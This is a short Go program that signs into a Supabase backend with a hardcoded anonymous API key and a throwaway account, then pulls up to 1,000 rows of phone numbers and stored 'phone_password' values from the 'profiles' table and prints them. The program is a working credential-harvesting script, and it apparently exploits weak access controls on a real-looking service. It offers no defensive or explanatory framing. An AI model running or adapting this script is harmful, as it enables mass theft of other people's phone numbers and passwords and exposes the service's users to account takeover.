package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

func main() {
	yrc := "https://backend.appmiaoda.com/projects/supabase258494737491738624"
	anon := "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoyMDgxMDU3MTQ4LCJpc3MiOiJzdXBhYmFzZSIsInJvbGUiOiJhbm9uIiwic3ViIjoiYW5vbiJ9.8xndiuP4qE6WE6AnNtft8cPNPpOGrJLxcZe4yP2Vz60"

	body := strings.NewReader(`{"email":"tty@pornhub.com","password":"tty"}`)
	req, _ := http.NewRequest("POST", yrc+"/auth/v1/token?grant_type=password", body)
	req.Header.Set("apikey", anon)
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	raw, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	var r map[string]interface{}
	json.Unmarshal(raw, &r)
	tok, _ := r["access_token"].(string)

	req2, _ := http.NewRequest("GET", yrc+"/rest/v1/profiles?select=phone,phone_password&phone_password=neq.&limit=1000", nil)
	req2.Header.Set("apikey", anon)
	req2.Header.Set("Authorization", "Bearer "+tok)

	resp2, err := http.DefaultClient.Do(req2)
	if err != nil {
		log.Fatal(err)
	}
	io.Copy(os.Stdout, resp2.Body)
	resp2.Body.Close()

	fmt.Println()
}